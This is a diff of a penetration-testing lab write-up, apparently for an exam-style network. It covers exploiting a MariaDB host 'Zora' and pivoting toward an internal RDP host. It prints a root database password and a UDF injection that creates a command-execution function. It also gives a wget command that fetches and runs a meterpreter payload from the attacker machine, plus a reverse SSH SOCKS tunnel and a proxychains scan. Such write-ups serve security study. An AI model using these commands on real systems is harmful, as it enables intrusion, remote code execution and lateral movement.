@@ -1,4 +1,4 @@
-# zora (10.5.5.11)
+# Zora (10.5.5.11)
 ***
 ## Exploitation
 
@@ -9,31 +9,50 @@ mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb --host=127.0.0.1 --port=13306
 ```
 
 > [!info] 
-> One of the techniques to execute OS commands using MySQL is through the use of **User Defined Functions (UDF)**. 
+> One of the techniques to execute OS commands using MySQL is through the use of **[User Defined Functions (UDF)](https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection/mysql-ssrf#user-defined-functions-to-rce)**. 
 > 
 > Using our console access (with root privilege), we are able to write a library (`.so`) containing a User Defined Functions (e.g function that execute OS commands) that can be then invoked through additional queries.
 
-2. We've created a function that will execute OS commands through the use of queries. 
+2. We've created a function named `sys_exec` (that will execute OS commands), through the use of the following queries. 
 ```
-set @shell = 0x<REPLACE_THIS>; select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so'; create function sys_exec returns int soname 'udf_sys_exec.so'; select * from mysql.func where name='sys_exec';
+MariaDB [(none)]> set @shell = 0x<HEX_OF_SO>; select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so'; create function sys_exec returns int soname 'udf_sys_exec.so'; select * from mysql.func where name='sys_exec';
 ```
 
-3. One of the technique to execute OS commands using MySQL is through the use of **User Defined Functions (UDF)**
+3. We downloaded and executed the meterpreter shell into the database server using the command:
+```
+MariaDB [(none)]> select sys_exec('wget http://KALI_IP/xshell.elf && chmod +x xshell.elf && ./xshell.elf');
+```
 
-
+4. We got our meterpreter shell afterwards.
+   ![[zora-meterpreter.png]]
+   
+***
+## Post-exploitation
 
 > [!info] 
-> Using our reverse shell, we checked on [[mounted-shares]] using `cat /etc/fstab`, and we found out that a share is mounted from the `10.5.5.20` host.
+> Using our reverse shell, we checked on mounted-share using `cat /etc/fstab`, and we found out that a share is mounted from the `10.5.5.20` host.  The host `10.5.5.20` is only accessible internally, so we have to set up another port forward for us to be able to access it directly from our Kali machine.
 > 
->  Also, a powershell script [[system_report.ps1]] was found inside `/mnt/Scripts` containing credentials of a domain user named `alex`
+> Also, a powershell script named `system_report.ps1` was found inside `/mnt/Scripts` containing credentials of a domain user named `alex`. 
    
-4. Generate key-pair and add public key to Kali
-5. Set up a dynamic port forward (SOCKS) from Zora to Kali using port 1080
+1. Using our meterpreter shell, we generated a keypair (`ssh-keygen`) and added zora's  public key to our Kali machine.
+``` 
+from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3Nza....Uzqt4+ns= mysql@zora
+```
+
+   
+2. We set up a dynamic port forward (SOCKS) from Zora to Kali using port **1080**
    
 ```
 ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@KALI_IP
 ```
 
-> [!info] 
-> `kali@kali:~$ proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20`  shows that port 3389 (RDP) is open.
+```
+kali@kali$ sudo nano /etc/proxychains4.conf
+...
+...
+socks4 127.0.0.1 1080
+```
+
+3. From our Kali, we scanned `10.5.5.20` for open ports using the command `proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20` 
+We discovered an open port **3389** running **Remote Desktop Protocol (RDP)**.
 
